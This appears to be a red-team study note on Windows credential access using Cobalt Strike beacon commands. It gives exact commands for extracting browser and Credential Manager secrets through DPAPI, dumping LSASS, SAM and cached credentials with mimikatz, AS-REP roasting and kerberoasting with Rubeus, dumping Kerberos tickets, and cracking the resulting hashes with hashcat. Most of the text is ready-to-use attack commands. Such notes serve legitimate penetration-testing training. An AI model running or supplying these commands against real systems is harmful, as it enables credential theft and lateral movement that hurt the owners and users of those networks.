a tactic where an adversary attempts to steal the authentication material of users, often used for priv esc or lateral movement

credentials from web browsers:
  browsers typically encrypt credentials stored using windows data protection api (DPAPI)
  these databases are typically stored under %LOCALAPPDATA%\<vendor>\<browser>\User Data\Default\Login Data
    e.g. %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
  if these databases are present, we may use tools such as SharpChrome.exe to extract the plain text creds
    beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins

windows credentials manager:
  additional creds that need to be stored may be stored here (such as RDP creds)
  the following commands can show the presence of stored creds:
    beacon> run vaultcmd /listcreds:"Windows Credentials" /all
    beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
  to decrypt these creds we need to decrypt the key using the DPAPI key then use that key to decrypt the creds:
    beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
    NOTE: 'credentials' will search the saved creds, '/rpc' leverages the microsoft backup key remote protocol to get the DPAPI key

OS credential dumping:
  technique used to extract creds stored/cached from the OS, requires SYSTEM
  LSASS is responsible for verifying creds/password changes/access tokens/etc and we may be able to extract creds from the LSASS memory
    mimikatz is built into cobalt strike, some basic mimikatz commands:
      prepending ! will tell mimikatz to elevate to SYSTEM first, and @ will tell mimikatz to impersonate beacon's thread token first
      beacon> mimikatz sekurlsa::logonpasswords //dump NTLM hashes from recently authenticated users
      beacon> mimikatz sekurlsa::ekeys //dump kerberos encryption keys, typically used to request kerberos tickets
      beacon> mimikatz !lsadump::sam //dumps the SAM
      beacon> mimikatz !lsadump::secrets //dumps secrets in memory or in HKLM/Security/Policy/Secrets (these are encrypted but the key is in HKLM/Security/Policy)
      beacon> mimikatz !lsadump::cache //dumps cached credentials stored in MS-Cache v2
we can use pass the hash or we can crack with hashcat:
    e.g. hashcat -a 0 -m 1000 ntlm.hash example.dict -r .\rules\dive.rule
         hashcat -a 0 -m 2100 mscachev2.hash example.dict -r .\rules\dive.rule

kerberos tickets:
  as-rep roasting:
    technique for obtaining plaintext passwords of accounts with kerberos preauth disabled
    allows adversary to send AS-REQs without any validation and the KDC responds with AS-REP containing the TGT for the target account
    e.g. beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
         then crack with hashcat -a 0 -m 18200 asrep.hash example.dict -r .\rules\dive.rule
  kerberoasting:
    technique for obtaining plaintext passwords of service accounts associated with an SPN
    allows adversary to send TGS-REQs for specific SPNs and get TGS-REPs that are encrypted using the service's secret
    e.g. beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
         then crack with hashcat -a 0 -m 13100 kerb.hash example.dict -r .\rules\dive.rule
    NOTE: a stealthier approach would be enumerating services first then roasting more selectively
      e.g. beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
           beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/lon-sql-1.contoso.com:1433 /simple /nowrap
  extracting tickets:
    technique for extracting kerberos tickets that are cached in memory
    allows adversary to enumerate every logon session and their associated tickets
    e.g. beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
         to extract the tickets, we can use rubeus' dump command (extract all or specify using luid and/or service)
         e.g. beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap
         NOTE: tickets with krbtgt as the service are TGTs
